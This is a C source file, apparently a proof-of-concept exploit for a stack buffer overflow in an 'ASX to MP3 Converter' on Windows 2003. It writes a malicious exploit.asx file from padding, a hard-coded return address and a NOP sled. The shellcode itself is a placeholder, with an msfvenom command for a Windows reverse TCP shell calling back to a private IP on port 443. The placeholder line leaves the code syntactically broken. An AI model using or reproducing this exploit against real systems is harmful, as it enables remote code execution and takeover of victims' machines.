/*
ASX to MP3 Converter SOF - Ivan Ivanovic Ivanov Иван-дурак
недействительный 31337 Team
holahola ~ https://www.exploit-db.com/exploits/38382/
Winblows 2k3
*/

#include <stdio.h>
#include <windows.h>
#include <malloc.h>

int main() {

    int i;
    char *overwrite_offset = malloc(241);
    char padding[] = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
    memcpy(overwrite_offset, padding, strlen(padding));

    memset(overwrite_offset + _msize(overwrite_offset) - 1, 0x90, 1);

    char retn[] = "\x9d\x78\x03\x10";
    char shellcode[] =
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" // NOP sled
ShellCode HERE and add \x90"; // msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.236 LPORT=443 EXITFUNC=thread -f c -e x86/xor_dynamic -b "\x00\x09\x0a\x1a"

    int buffer_size = _msize(overwrite_offset) + strlen(retn) + strlen(shellcode);
    char *buffer = malloc(buffer_size);

    memcpy(buffer, overwrite_offset, _msize(overwrite_offset));
    memcpy(buffer + _msize(overwrite_offset), retn, strlen(retn));
    memcpy(buffer + _msize(overwrite_offset) + strlen(retn), shellcode, strlen(shellcode));
    memset(buffer + buffer_size - 1, 0x00, 1);

    FILE * fp;
    fp = fopen("exploit.asx","w");
    fprintf(fp, buffer);
    fclose(fp);

    return 0;

}
